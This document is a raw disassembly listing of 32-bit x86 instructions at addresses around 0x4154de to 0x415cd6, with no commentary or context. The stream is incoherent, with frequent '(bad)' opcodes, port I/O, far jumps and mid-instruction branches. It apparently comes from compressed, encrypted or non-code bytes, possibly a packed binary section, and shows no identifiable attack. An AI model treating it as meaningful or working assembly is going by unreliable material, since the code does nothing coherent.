  4154de:	loopne 0x415522
  4154e0:	fisubr WORD PTR [ebp+edx*8+0x172fd92d]
  4154e7:	jl     0x415522
  4154e9:	xchg   edi,eax
  4154ea:	ret    0x100d
  4154ed:	and    BYTE PTR [edx-0x20b53de1],0x49
  4154f4:	rol    DWORD PTR [edx+0x1f817a07],cl
  4154fa:	fxch   st(2)
  4154fc:	popf   
  4154fd:	data16 lods al,BYTE PTR ds:[esi]
  4154ff:	lods   al,BYTE PTR ds:[esi]
  415500:	gs in  al,0x33
  415503:	repnz lahf 
  415505:	aas    
  415506:	or     ecx,DWORD PTR [edi+0x4]
  415509:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41550a:	jmp    0x8c89:0xea947d9c
  415511:	call   0x7f88:0xc7d31a95
  415518:	xor    bl,bh
  41551a:	mov    edx,0xf0f8ffc6
  41551f:	icebp  
  415520:	es into 
  415522:	out    dx,al
  415523:	sub    al,0x51
  415525:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415526:	cmp    ch,BYTE PTR [esi]
  415528:	sub    BYTE PTR [esi],cl
  41552a:	adc    DWORD PTR [esp+edi*4],ebp
  41552d:	jbe    0xc6eae26c
  415533:	rol    DWORD PTR [ecx-0x26b89474],cl
  415539:	mov    ebx,0xd13e0d50
  41553e:	cmp    DWORD PTR [eax-0x264de894],ebp
  415544:	or     bh,0x73
  415547:	push   cs
  415548:	inc    eax
  415549:	sub    ebx,DWORD PTR [ecx+0x3b770dec]
  41554f:	push   esi
  415550:	add    al,0xbb
  415552:	mov    edi,0xc4fdcbe4
  415557:	pop    esp
  415558:	xor    DWORD PTR [ebx+0x25db6bab],esi
  41555e:	popf   
  41555f:	dec    eax
  415560:	sahf   
  415561:	push   es
  415562:	fidiv  DWORD PTR [esp+esi*4+0x7f]
  415566:	pop    edx
  415567:	push   cs
  415568:	mov    WORD PTR [esi+edi*8],ss
  41556b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41556c:	pop    ss
  41556d:	sbb    cl,BYTE PTR [ebx+0x6c60c961]
  415573:	pop    ecx
  415574:	jo     0x4154fd
  415576:	mov    ebp,0xb8b1cdcc
  41557b:	and    al,0x5c
  41557d:	cmp    al,0xb
  41557f:	xchg   ecx,eax
  415580:	sub    edx,ebx
  415582:	lods   al,BYTE PTR ds:[esi]
  415583:	fs mov ebp,0x685f2324
  415589:	sub    eax,0x5158aad5
  41558e:	mov    DWORD PTR [esi+0x69995ae0],ecx
  415594:	fsubr  QWORD PTR [eax+0x3a]
  415597:	(bad)  
  415598:	push   eax
  415599:	outs   dx,BYTE PTR ds:[si]
  41559b:	mov    edx,DWORD PTR [edx+ebx*4-0x40a44db2]
  4155a2:	inc    ecx
  4155a3:	fwait
  4155a4:	sub    bl,dl
  4155a6:	add    al,0x27
  4155a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155a9:	sbb    al,BYTE PTR [edx+ebx*8+0x4b]
  4155ad:	pop    eax
  4155ae:	pop    ss
  4155af:	or     al,0xdd
  4155b1:	xor    BYTE PTR [ebp-0x5e071ddd],bl
  4155b7:	fist   DWORD PTR [ebx+ebp*8]
  4155ba:	pop    esp
  4155bb:	nop
  4155bc:	sbb    eax,0xc117ed51
  4155c1:	inc    esi
  4155c2:	sub    al,0x5c
  4155c4:	cs pop ecx
  4155c6:	jb     0x41557a
  4155c8:	sbb    bh,ah
  4155ca:	arpl   sp,cx
  4155cc:	loopne 0x4155d5
  4155ce:	xor    edi,edi
  4155d0:	and    al,0x5
  4155d2:	aas    
  4155d3:	div    DWORD PTR [ecx+edx*8-0x2a235f11]
  4155da:	test   BYTE PTR [ecx+0x3],bl
  4155dd:	mov    al,0x55
  4155df:	add    al,0x6d
  4155e1:	cwde   
  4155e2:	loopne 0x4155da
  4155e4:	and    ebx,eax
  4155e6:	cmp    eax,0x716803d5
  4155eb:	mov    edx,0xeebb5f71
  4155f0:	fstp   DWORD PTR [edx-0x65a9082f]
  4155f6:	jne    0x41559b
  4155f8:	mov    bh,0x2b
  4155fa:	jne    0x4155be
  4155fc:	and    DWORD PTR [eax+ecx*2-0x4435d288],0x2a
  415604:	sub    eax,0xd3ee0fb7
  415609:	dec    ecx
  41560a:	xchg   ecx,eax
  41560b:	mov    ecx,0xf35ea5aa
  415610:	xchg   BYTE PTR [ecx],dh
  415612:	fdivr  DWORD PTR [edi]
  415614:	(bad)  
  415615:	xlat   BYTE PTR ds:[ebx]
  415616:	cmp    eax,0xada95608
  41561b:	lea    edx,[edi]
  41561d:	mov    ah,0x4e
  41561f:	jns    0x4155b8
  415621:	test   al,0x14
  415623:	loope  0x415649
  415625:	or     bl,bl
  415627:	xchg   al,dh
  415629:	mov    esp,0x6f62b9ca
  41562e:	dec    esi
  41562f:	(bad)  
  415630:	iret   
  415631:	loope  0x4155dd
  415633:	push   ds
  415634:	(bad)  
  415635:	inc    ebp
  415636:	popf   
  415637:	les    ebx,FWORD PTR [ebx-0x7cbfbb0c]
  41563d:	pop    es
  41563e:	jg     0x415681
  415640:	cwde   
  415641:	or     edx,edx
  415643:	mov    ebp,0x69c9ae4c
  415648:	push   es
  415649:	push   cs
  41564a:	sbb    al,0x7f
  41564c:	call   0x1d548fed
  415651:	ds retf 0xa571
  415655:	adc    al,0x1f
  415657:	mov    ?,WORD PTR [edx]
  415659:	lods   al,BYTE PTR ds:[esi]
  41565a:	or     ch,ah
  41565c:	jnp    0x4156b8
  41565e:	test   DWORD PTR [edx+0x52db1f92],ecx
  415664:	fwait
  415665:	daa    
  415666:	fincstp 
  415668:	sbb    dl,ch
  41566a:	sbb    edi,0x9fd9181b
  415670:	sub    ch,BYTE PTR [ebx-0x6dabe0e]
  415676:	stc    
  415677:	aas    
  415678:	out    0xea,eax
  41567a:	mov    esi,0x991be252
  41567f:	ja     0x415673
  415681:	daa    
  415682:	stos   BYTE PTR es:[edi],al
  415683:	mov    ds,WORD PTR [ebp-0x70676d89]
  415689:	mov    esi,0x8d30f487
  41568e:	fdivrp st(7),st
  415690:	fscale 
  415692:	and    dh,BYTE PTR [esi]
  415694:	ja     0x4156ec
  415696:	dec    esp
  415697:	add    al,0x45
  415699:	or     dl,BYTE PTR gs:[ebx+0x106319c2]
  4156a0:	push   ds
  4156a1:	imul   ebx,DWORD PTR [edi-0x5],0x77
  4156a5:	loop   0x41569d
  4156a7:	dec    edi
  4156a8:	stos   DWORD PTR es:[edi],eax
  4156a9:	ret    
  4156aa:	aad    0xec
  4156ac:	pushf  
  4156ad:	lea    ecx,[ebp-0x6a]
  4156b0:	lea    esi,[esi-0x674a8541]
  4156b6:	test   dl,cl
  4156b8:	scas   al,BYTE PTR es:[edi]
  4156b9:	mov    esi,0x45be97de
  4156be:	test   DWORD PTR gs:[ebp-0x46],esp
  4156c2:	cmc    
  4156c3:	out    0xd5,eax
  4156c5:	lea    edi,[edx+edx*8-0x38]
  4156c9:	pop    ss
  4156ca:	mov    eax,0x3416cca7
  4156cf:	sti    
  4156d0:	sub    cl,BYTE PTR [ecx-0x23]
  4156d3:	stc    
  4156d4:	(bad)  
  4156d5:	pop    edi
  4156d6:	je     0x4156f2
  4156d8:	push   es
  4156d9:	cmc    
  4156da:	iret   
  4156db:	jae    0x41574a
  4156dd:	enter  0xf42e,0xf0
  4156e1:	ret    0xcbca
  4156e4:	loopne 0x41573b
  4156e6:	or     al,0xf6
  4156e8:	aad    0xbf
  4156ea:	mov    eax,ds:0x781b70fe
  4156ef:	mov    dh,0x54
  4156f1:	aam    0xd1
  4156f3:	xchg   edi,eax
  4156f4:	sbb    BYTE PTR [eax],0xf9
  4156f7:	mov    edx,0xc9aa76eb
  4156fc:	xchg   ah,ch
  4156fe:	cmp    ebx,DWORD PTR [ebx]
  415700:	mov    dh,BYTE PTR [ebx]
  415702:	inc    edx
  415703:	lods   eax,DWORD PTR ds:[esi]
  415704:	xchg   ebx,eax
  415705:	test   DWORD PTR [ebx+ebx*4],edx
  415708:	(bad)  [eax]
  41570a:	lods   eax,DWORD PTR ds:[esi]
  41570b:	jmp    0xe09252ef
  415710:	aas    
  415711:	shl    DWORD PTR ds:0xd4391641,cl
  415717:	hlt    
  415718:	jmp    0x41578f
  41571a:	mov    WORD PTR [eax-0x4f442f4d],fs
  415720:	xor    al,0x4f
  415722:	adc    esi,0xa005980e
  415728:	out    0xfd,al
  41572a:	mov    ebp,0x16cac06d
  41572f:	pop    esp
  415730:	adc    eax,0xf56eccd0
  415735:	(bad)  [ecx]
  415737:	push   ecx
  415738:	mov    ah,0xf
  41573a:	jb     0x415720
  41573c:	lods   al,BYTE PTR ds:[esi]
  41573d:	mov    ch,0x7a
  41573f:	sub    BYTE PTR [ecx-0x33],ah
  415742:	enter  0x1053,0xde
  415746:	mov    bh,0xc6
  415748:	mov    bh,0x21
  41574b:	inc    edx
  41574c:	adc    ch,dl
  41574e:	xlat   BYTE PTR ds:[ebx]
  41574f:	jne    0x4156db
  415751:	in     eax,dx
  415752:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415753:	xor    al,0x84
  415755:	jbe    0x415725
  415757:	xchg   edx,eax
  415758:	jp     0x4157d9
  41575a:	aaa    
  41575b:	(bad)  
  41575c:	in     al,0x91
  41575e:	push   0x7
  415760:	pop    ecx
  415761:	push   ecx
  415762:	and    eax,0xe8d7e3a7
  415767:	fwait
  415768:	xchg   ebx,eax
  415769:	fmul   QWORD PTR [si]
  41576c:	xor    eax,0xc713c2ef
  415771:	mov    dl,0xb2
  415773:	xchg   ebx,eax
  415774:	loopne 0x4157c8
  415776:	xor    al,0x7a
  415778:	aad    0x8a
  41577a:	cwde   
  41577b:	test   BYTE PTR ds:0x747950f9,bh
  415781:	scas   al,BYTE PTR es:[edi]
  415782:	push   esi
  415783:	cmp    ecx,DWORD PTR [esp+edi*2+0x6c]
  415787:	and    ah,BYTE PTR [edi+0x1693c781]
  41578d:	gs mov esp,0xdabab88c
  415793:	aad    0x4b
  415795:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415796:	xor    esi,esp
  415798:	mov    al,ds:0x87fc6481
  41579d:	(bad)  
  41579e:	in     eax,0x3a
  4157a0:	imul   edi,DWORD PTR [edx-0x74],0x576307e
  4157a7:	xor    ah,BYTE PTR [edi]
  4157a9:	loope  0x4157c3
  4157ab:	test   al,0xb8
  4157ad:	pop    esi
  4157ae:	(bad)  
  4157af:	ja     0x4157e9
  4157b1:	xchg   ebp,eax
  4157b2:	mov    esp,0x5942b4ea
  4157b7:	xchg   ebx,eax
  4157b8:	sbb    al,0x29
  4157ba:	scas   al,BYTE PTR es:[edi]
  4157bb:	ret    0xd2b
  4157be:	add    eax,0xf8261211
  4157c3:	mov    eax,ds:0x98f66416
  4157c8:	ror    DWORD PTR [ebp+edx*4+0x14ed0bd],1
  4157cf:	rcl    bl,0x36
  4157d2:	xchg   ebx,eax
  4157d3:	jns    0x4157ea
  4157d5:	(bad)  
  4157d6:	jmp    0xab91:0xda839beb
  4157dd:	div    DWORD PTR [esi+0x5]
  4157e0:	ins    DWORD PTR es:[edi],dx
  4157e1:	sub    al,0x6d
  4157e3:	dec    eax
  4157e4:	in     al,0x8d
  4157e6:	pushf  
  4157e7:	popa   
  4157e8:	fisub  WORD PTR [ebx]
  4157ea:	mov    esp,0xa44bd657
  4157ef:	mov    eax,ds:0x1153816e
  4157f4:	pop    esp
  4157f5:	gs push esi
  4157f7:	mul    BYTE PTR [ecx-0x62]
  4157fa:	sbb    ebp,DWORD PTR [esi+0x45a8ec93]
  415800:	add    eax,0xfffa81b0
  415805:	addr16 or eax,0x21c121f0
  41580b:	jle    0x4157fd
  41580d:	pop    es
  41580e:	cdq    
  41580f:	mov    cl,0xe4
  415811:	add    al,BYTE PTR [edi]
  415813:	jo     0x4157d5
  415815:	shr    DWORD PTR [esi+ecx*1+0x7e],cl
  415819:	arpl   sp,si
  41581b:	mov    esi,0xd72ff4e0
  415820:	mov    dh,0x7b
  415822:	pop    ss
  415823:	ja     0x415859
  415825:	cwde   
  415826:	das    
  415827:	jb     0x41583b
  415829:	iret   
  41582a:	adc    ah,BYTE PTR [eax+0x524ff909]
  415830:	mov    eax,0xa583f272
  415835:	mov    al,0x7c
  415837:	popf   
  415838:	add    al,0x38
  41583a:	sahf   
  41583b:	inc    edx
  41583c:	add    eax,0xec9b43a8
  415841:	cdq    
  415842:	loop   0x415836
  415844:	mov    eax,0x4ef47b5b
  415849:	mov    esp,esi
  41584b:	adc    DWORD PTR [eax],0xffffff8d
  41584e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41584f:	and    ecx,DWORD PTR [ebp-0x31204ade]
  415855:	or     BYTE PTR [eax-0x70909a59],cl
  41585b:	fcom   QWORD PTR [esi+edi*4]
  41585e:	dec    DWORD PTR [ebp+0x68aa3d23]
  415864:	cmp    DWORD PTR [edi-0x770c8793],0x5ec42ef6
  41586e:	cdq    
  41586f:	xchg   edx,eax
  415870:	jl     0x4158c3
  415872:	xchg   edi,eax
  415873:	repz mov eax,0xaa6b142e
  415879:	test   al,0x9f
  41587b:	sbb    al,BYTE PTR [eax+0x61]
  41587e:	mov    eax,0x6e8fa83
  415883:	dec    esi
  415884:	mov    cl,0x2b
  415886:	xlat   BYTE PTR ds:[ebx]
  415887:	xchg   esi,eax
  415888:	inc    edi
  415889:	test   BYTE PTR ds:0xdc88f6b5,al
  41588f:	aad    0x30
  415891:	adc    edx,ebp
  415893:	in     eax,0xbc
  415895:	cmp    cl,bl
  415897:	ss push edi
  415899:	(bad)  
  41589b:	out    0xc7,al
  41589d:	hlt    
  41589e:	stos   BYTE PTR es:[edi],al
  41589f:	pop    ds
  4158a0:	loop   0x415916
  4158a2:	cwde   
  4158a3:	xor    BYTE PTR [eax-0x6d000548],dl
  4158a9:	bound  ebx,QWORD PTR [eax+edx*1+0x6c]
  4158ad:	sar    esi,1
  4158af:	cmp    eax,0xcfc447ff
  4158b4:	dec    edi
  4158b5:	add    al,0x50
  4158b7:	sti    
  4158b8:	push   ebx
  4158b9:	shr    DWORD PTR [ecx+0x12],1
  4158bc:	mov    ds:0x5bf3a5c3,eax
  4158c1:	cmp    eax,0x3981e133
  4158c6:	inc    esp
  4158c7:	mov    eax,ds:0x69c62fbc
  4158cc:	cwde   
  4158cd:	js     0x41585b
  4158cf:	dec    ebx
  4158d0:	and    al,0x68
  4158d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158d3:	stos   DWORD PTR es:[edi],eax
  4158d4:	adc    ecx,DWORD PTR [edi-0x715a649]
  4158da:	xchg   edx,eax
  4158db:	add    bl,BYTE PTR [eax+0x39]
  4158de:	adc    edx,DWORD PTR [esi-0x59]
  4158e1:	pop    es
  4158e2:	in     eax,dx
  4158e3:	sub    al,al
  4158e5:	mov    eax,0xbfc427c6
  4158ea:	cmp    eax,0xe30d2554
  4158ef:	or     DWORD PTR [edi+0x54],0xc7966a25
  4158f6:	push   0xffffff9f
  4158f8:	and    eax,0x22d565fb
  4158fd:	and    eax,0x1533eda4
  415902:	stos   BYTE PTR es:[edi],al
  415903:	sbb    BYTE PTR ds:0x9fdbbd1f,ah
  415909:	or     ch,BYTE PTR [eax]
  41590b:	pop    edx
  41590c:	or     ah,bh
  41590e:	aaa    
  41590f:	pop    edi
  415910:	mov    esi,0x760e887b
  415915:	in     al,0x23
  415917:	sub    eax,0xb3a435d7
  41591c:	nop
  41591d:	daa    
  41591e:	add    DWORD PTR cs:[edx-0x39010d0a],eax
  415925:	loopne 0x415942
  415927:	lods   eax,DWORD PTR ds:[esi]
  415928:	cmp    al,0x2b
  41592a:	sbb    BYTE PTR [ecx],0x38
  41592d:	fst    QWORD PTR [ebp-0x68]
  415930:	xchg   edx,eax
  415931:	pop    esi
  415932:	push   edx
  415934:	dec    ebp
  415935:	ins    DWORD PTR es:[edi],dx
  415936:	in     eax,0x12
  415938:	retf   
  415939:	aas    
  41593a:	leave  
  41593b:	mov    edx,0xb059396e
  415940:	mov    DWORD PTR [ebx+0x3ac6507a],ebx
  415946:	mov    eax,0x5bfa5133
  41594b:	xor    ah,0x9f
  41594e:	xchg   ah,dl
  415950:	jnp    0x415913
  415952:	test   al,0xb9
  415954:	shl    DWORD PTR [edi],0x59
  415957:	icebp  
  415958:	push   ebx
  415959:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41595a:	or     eax,0x5cb65844
  41595f:	fcomp  st(6)
  415961:	scas   al,BYTE PTR es:[edi]
  415962:	sbb    eax,0xd788e28a
  415967:	push   0xa32a1deb
  41596c:	and    eax,DWORD PTR [eax+0x68890ae2]
  415972:	in     eax,0xa5
  415974:	xchg   edx,eax
  415975:	push   0xffffffee
  415977:	mov    ebx,0x2dcc0676
  41597c:	in     al,0xc4
  41597e:	mov    eax,0xa00ab037
  415983:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415984:	pushf  
  415985:	ret    0xecf6
  415988:	imul   edx,DWORD PTR [ebx+esi*8+0x59],0x7e
  41598d:	mov    WORD PTR [edi+esi*2-0x3f],ss
  415991:	adc    BYTE PTR [esi],dl
  415993:	(bad)  
  415994:	pop    ebx
  415995:	ss adc eax,0x13de1fb0
  41599b:	ret    
  41599c:	mov    edi,esi
  41599e:	sahf   
  41599f:	pop    eax
  4159a0:	sub    al,BYTE PTR [ecx]
  4159a2:	pop    edx
  4159a3:	mov    ch,0x3e
  4159a5:	mov    esi,0xa4fe4662
  4159aa:	sbb    BYTE PTR [ebp+0x2a7e07a7],0x33
  4159b1:	and    ecx,DWORD PTR [edi+0x6cae4e4a]
  4159b7:	inc    di
  4159b9:	dec    ebx
  4159ba:	ret    
  4159bb:	push   eax
  4159bc:	pop    eax
  4159bd:	div    BYTE PTR [esi-0x5a]
  4159c0:	lods   eax,DWORD PTR ds:[esi]
  4159c1:	jo     0x41594f
  4159c3:	add    bl,dh
  4159c5:	xchg   BYTE PTR [esi],cl
  4159c7:	lock pop ds
  4159c9:	push   ebx
  4159ca:	mov    bh,0xc4
  4159cc:	pop    ecx
  4159cd:	or     ebp,DWORD PTR ds:0x5ec91842
  4159d3:	and    edx,edi
  4159d5:	jle    0x41597e
  4159d7:	mov    bl,0x33
  4159d9:	dec    esp
  4159da:	xor    BYTE PTR [eax+0x24b0679c],dl
  4159e0:	xchg   edi,eax
  4159e1:	add    cl,al
  4159e3:	loop   0x415965
  4159e5:	pusha  
  4159e6:	add    eax,DWORD PTR [esi-0x14]
  4159e9:	imul   esp,eax,0x6e
  4159ec:	or     ebx,ecx
  4159ee:	add    bl,BYTE PTR [edi+0x66c64c6e]
  4159f4:	cli    
  4159f5:	sub    eax,0xae9861a7
  4159fa:	ficomp WORD PTR [esi-0x58]
  4159fd:	mov    ah,0xbd
  4159ff:	stc    
  415a00:	ror    BYTE PTR [ecx],cl
  415a02:	jmp    0x415a55
  415a04:	mov    esi,0xbacb53ae
  415a09:	shr    DWORD PTR [eax+ebx*8],1
  415a0c:	lods   eax,DWORD PTR ds:[esi]
  415a0d:	das    
  415a0e:	loop   0x415a13
  415a10:	sub    DWORD PTR [esi+0x30910591],esi
  415a16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a17:	mov    al,ds:0xca953537
  415a1c:	popa   
  415a1d:	ret    
  415a1e:	or     al,0x63
  415a20:	dec    eax
  415a21:	lahf   
  415a22:	or     ecx,esp
  415a24:	pop    esi
  415a25:	jmp    0x4159b4
  415a27:	mov    ah,0xcc
  415a29:	push   ebx
  415a2a:	mov    bh,ch
  415a2c:	cmp    al,0xce
  415a2e:	push   esi
  415a2f:	xor    cl,BYTE PTR [esi-0x3ddf4b96]
  415a35:	stc    
  415a36:	popa   
  415a37:	icebp  
  415a38:	clc    
  415a39:	adc    al,BYTE PTR [ebx]
  415a3b:	dec    ebx
  415a3c:	cmp    al,0x1f
  415a3e:	clc    
  415a3f:	mov    eax,ds:0x3d743761
  415a44:	repz pop edx
  415a46:	dec    edi
  415a47:	cwd    
  415a49:	mov    esi,0xb32eef73
  415a4e:	push   eax
  415a4f:	ins    DWORD PTR es:[edi],dx
  415a50:	lods   al,BYTE PTR ds:[esi]
  415a51:	mov    dl,0x62
  415a53:	push   ebx
  415a54:	pop    ss
  415a55:	push   ss
  415a56:	cmp    ebx,0x18
  415a59:	sub    eax,0x4ec8ab6
  415a5e:	inc    ebp
  415a5f:	setb   BYTE PTR [edx+0x4a321907]
  415a66:	ss dec edx
  415a68:	inc    edi
  415a69:	ins    DWORD PTR es:[edi],dx
  415a6a:	shr    eax,1
  415a6c:	sbb    al,BYTE PTR [esi+0x640138dc]
  415a72:	mov    ecx,0xc02d7f7c
  415a77:	mov    al,ds:0x8d817267
  415a7c:	sbb    al,0x57
  415a7e:	and    al,0x63
  415a80:	push   eax
  415a81:	shr    DWORD PTR [ecx],0x80
  415a84:	mov    bl,0xb9
  415a86:	jle    0x415adf
  415a88:	fs jne 0x415ae5
  415a8b:	out    0x67,al
  415a8d:	and    edi,edx
  415a8f:	jb     0x415a50
  415a91:	xchg   BYTE PTR [ebx+0x3c1fbd9f],cl
  415a97:	mov    eax,ds:0xbc0eccb2
  415a9c:	mov    ah,0x57
  415a9e:	pop    es
  415a9f:	inc    esi
  415aa0:	xor    BYTE PTR [edi+0x34e532b0],dl
  415aa6:	out    dx,al
  415aa7:	inc    esi
  415aa8:	mov    bl,0x8b
  415aaa:	mov    ah,0xfa
  415aac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415aad:	inc    esi
  415aae:	ins    DWORD PTR es:[edi],dx
  415aaf:	inc    ecx
  415ab0:	mov    fs,WORD PTR [eax]
  415ab2:	call   0xde1:0x2d45352b
  415ab9:	cmc    
  415aba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415abb:	js     0x415b2c
  415abd:	dec    ebx
  415abe:	popf   
  415abf:	sbb    bl,BYTE PTR [eax]
  415ac1:	cmp    al,0x4e
  415ac3:	mov    ecx,0x31071992
  415ac8:	ficomp WORD PTR ds:0xa5aead2d
  415ace:	loope  0x415af9
  415ad0:	imul   BYTE PTR [eax+0xa]
  415ad3:	mov    ch,0x9d
  415ad5:	add    BYTE PTR [eax-0x80],ch
  415ad8:	scas   eax,DWORD PTR es:[edi]
  415ad9:	addr16 loop 0x415a9e
  415adc:	fdivr  st(0),st
  415ade:	test   al,0x45
  415ae0:	je     0x415b06
  415ae2:	(bad)  
  415ae3:	data16 in al,dx
  415ae5:	push   0x8cf7a331
  415aea:	out    0x40,al
  415aec:	ret    0x5da1
  415aef:	pop    ebx
  415af0:	pop    ecx
  415af1:	sti    
  415af2:	ficomp WORD PTR ds:0xa32bbeba
  415af8:	and    BYTE PTR [ecx+0x686f3b41],bh
  415afe:	cmp    al,0xb4
  415b00:	add    eax,0x6b6ec4da
  415b05:	es ss and eax,0xce945944
  415b0c:	pop    edi
  415b0d:	shr    edx,cl
  415b0f:	mov    DWORD PTR es:[esi-0x73a0bcb2],ebp
  415b16:	or     bh,0x4c
  415b19:	fldcw  WORD PTR [ecx+0x61a35581]
  415b1f:	xor    eax,0xe1ddaabe
  415b24:	nop
  415b25:	xchg   esi,eax
  415b26:	xchg   ebx,eax
  415b27:	jl     0x415b42
  415b29:	inc    ebp
  415b2a:	test   DWORD PTR [ecx],0x8f8cb787
  415b30:	mov    cl,0x28
  415b32:	imul   BYTE PTR [esi]
  415b34:	ret    0xc204
  415b37:	sub    DWORD PTR es:[ecx],esp
  415b3a:	and    DWORD PTR [ebp-0x53c3dd4d],edx
  415b40:	mov    DWORD PTR [esp+edi*8],ecx
  415b43:	push   edx
  415b44:	and    BYTE PTR [ecx],bh
  415b46:	aaa    
  415b47:	mov    ebp,0xb323848f
  415b4c:	pop    ecx
  415b4d:	add    esi,DWORD PTR ds:0x17f3decb
  415b53:	sub    ebx,eax
  415b55:	repz (bad) 
  415b58:	jge    0x415aef
  415b5a:	adc    eax,0x81ff4fa8
  415b5f:	in     al,0x63
  415b61:	add    esp,0x4
  415b64:	mov    WORD PTR ds:0xfee925c8,ds
  415b6a:	pop    ds
  415b6b:	lods   al,BYTE PTR ds:[esi]
  415b6c:	mov    eax,es
  415b6e:	call   0x6d527b5a
  415b73:	pop    edx
  415b74:	sbb    al,0xa0
  415b76:	mov    edi,edx
  415b78:	imul   esp,DWORD PTR [ebx-0xab10e25],0xfffffffc
  415b7f:	mov    cl,0xa0
  415b81:	sbb    eax,0x1385f712
  415b86:	jmp    0x415b2d
  415b88:	ds mov ebp,0xe291f35a
  415b8e:	or     al,0xde
  415b90:	xchg   dl,cl
  415b92:	lods   al,BYTE PTR ds:[esi]
  415b93:	jns    0x415bab
  415b95:	fidivr WORD PTR ds:0xc0e6c826
  415b9b:	dec    edi
  415b9c:	leave  
  415b9d:	imul   edi,esp,0x3
  415ba0:	xchg   edx,eax
  415ba1:	inc    edi
  415ba2:	scas   al,BYTE PTR es:[edi]
  415ba3:	fcomi  st,st(5)
  415ba5:	imul   ecx,DWORD PTR [edx],0x8
  415ba8:	in     eax,0xbc
  415baa:	out    dx,eax
  415bab:	in     eax,0x92
  415bad:	inc    ebp
  415bae:	sbb    BYTE PTR [edx],ah
  415bb0:	cdq    
  415bb1:	jns    0x415b36
  415bb3:	push   esp
  415bb4:	sti    
  415bb5:	mov    ds:0xe90a46f3,eax
  415bba:	gs lahf 
  415bbc:	rcr    dh,0x61
  415bbf:	push   0x500d9bb
  415bc4:	imul   esp,DWORD PTR [esi+0x2f],0xd7b0fb50
  415bcb:	push   cs
  415bcc:	pop    ss
  415bcd:	xchg   edx,eax
  415bce:	jge    0x415b9f
  415bd0:	jecxz  0x415b9d
  415bd2:	fsubr  DWORD PTR [edx-0x51]
  415bd5:	stc    
  415bd6:	(bad)  
  415bd7:	out    dx,al
  415bd8:	(bad)  
  415bd9:	jmp    DWORD PTR [edx+0xb]
  415bdc:	dec    esp
  415bdd:	cs mov edx,0xa5273bcb
  415be3:	iret   
  415be4:	cwde   
  415be5:	jnp    0x415c5b
  415be7:	push   ecx
  415be8:	pop    edx
  415be9:	pop    DWORD PTR [ebx]
  415beb:	xchg   BYTE PTR [ebx-0x71],dl
  415bee:	mov    edi,0x3557e340
  415bf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bf4:	lods   eax,DWORD PTR ds:[esi]
  415bf5:	mov    al,0x9
  415bf7:	push   edx
  415bf8:	stos   BYTE PTR es:[edi],al
  415bf9:	jnp    0x415bfb
  415bfb:	push   edi
  415bfc:	ret    0xab12
  415bff:	mov    esi,0xf3a7ca3
  415c04:	xor    dl,dh
  415c06:	mov    al,ds:0x3ebdb736
  415c0b:	es or  eax,0xaec4b942
  415c11:	cld    
  415c12:	jmp    0xc767e7d5
  415c17:	mov    edx,edi
  415c19:	cdq    
  415c1a:	mov    BYTE PTR [ebx-0x2e],cl
  415c1d:	ret    
  415c1e:	push   esi
  415c1f:	adc    al,0x13
  415c21:	mov    edx,0x3b1af3a3
  415c26:	es cwde 
  415c28:	lea    eax,[ecx]
  415c2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c2b:	sbb    eax,0x7e33ae16
  415c30:	out    0x3e,eax
  415c32:	xchg   BYTE PTR [edx],bl
  415c34:	pop    edi
  415c35:	out    0x39,eax
  415c37:	dec    ebp
  415c38:	or     BYTE PTR [esi+0x41],bl
  415c3b:	jnp    0x415c19
  415c3d:	outs   dx,DWORD PTR ds:[esi]
  415c3e:	fwait
  415c3f:	aaa    
  415c40:	mov    ebx,0x464888e5
  415c45:	mov    ebx,0x396d4102
  415c4a:	cld    
  415c4b:	cmp    esp,DWORD PTR [edx-0x5b]
  415c4e:	sbb    al,0x37
  415c50:	jecxz  0x415c79
  415c52:	int    0x45
  415c54:	lahf   
  415c55:	mov    ds:0x43b6a599,al
  415c5a:	mov    al,ch
  415c5c:	xchg   ebx,eax
  415c5d:	nop
  415c5e:	ds jecxz 0x415ccd
  415c61:	xchg   esp,eax
  415c62:	popa   
  415c63:	or     eax,0x45322a29
  415c68:	push   esi
  415c69:	mov    dh,0x5
  415c6b:	jbe    0x415c5e
  415c6d:	jge    0x415cdb
  415c6f:	lds    ebx,FWORD PTR [edi-0x777784eb]
  415c75:	jns    0x415c7c
  415c77:	and    al,0x4d
  415c79:	push   cs
  415c7a:	adc    BYTE PTR [edi+eax*4-0x60ed9de7],ah
  415c81:	(bad)  
  415c82:	gs std 
  415c84:	popa   
  415c85:	jle    0x415c28
  415c87:	(bad)  
  415c88:	pop    esi
  415c89:	xchg   edx,eax
  415c8a:	adc    bl,bl
  415c8c:	push   eax
  415c8d:	retf   
  415c8e:	out    dx,eax
  415c8f:	adc    al,0x6
  415c91:	in     eax,0xa5
  415c93:	pop    ecx
  415c94:	mov    eax,0x697f45c8
  415c99:	pop    es
  415c9a:	in     al,0x2d
  415c9c:	add    BYTE PTR [edi-0x12],bh
  415c9f:	jle    0x415c6b
  415ca1:	pushf  
  415ca2:	out    dx,al
  415ca3:	or     eax,0x735faab
  415ca8:	adc    ch,BYTE PTR [edi-0x5b4d4570]
  415cae:	(bad)  
  415caf:	push   esi
  415cb0:	mov    bh,0x1a
  415cb2:	xchg   esi,eax
  415cb3:	imul   ebp,DWORD PTR [edi],0x5e
  415cb6:	neg    DWORD PTR [edi]
  415cb8:	ret    0x523d
  415cbb:	into   
  415cbc:	adc    eax,0xead9a57a
  415cc1:	jle    0x415d37
  415cc3:	jle    0x415ce0
  415cc5:	hlt    
  415cc6:	sbb    al,0xbb
  415cc8:	mov    al,ds:0xa8b7f225
  415ccd:	mov    edx,0xe288295c
  415cd2:	jae    0x415cb7
  415cd4:	jno    0x415c7d
  415cd6:	cmp    al,0x15
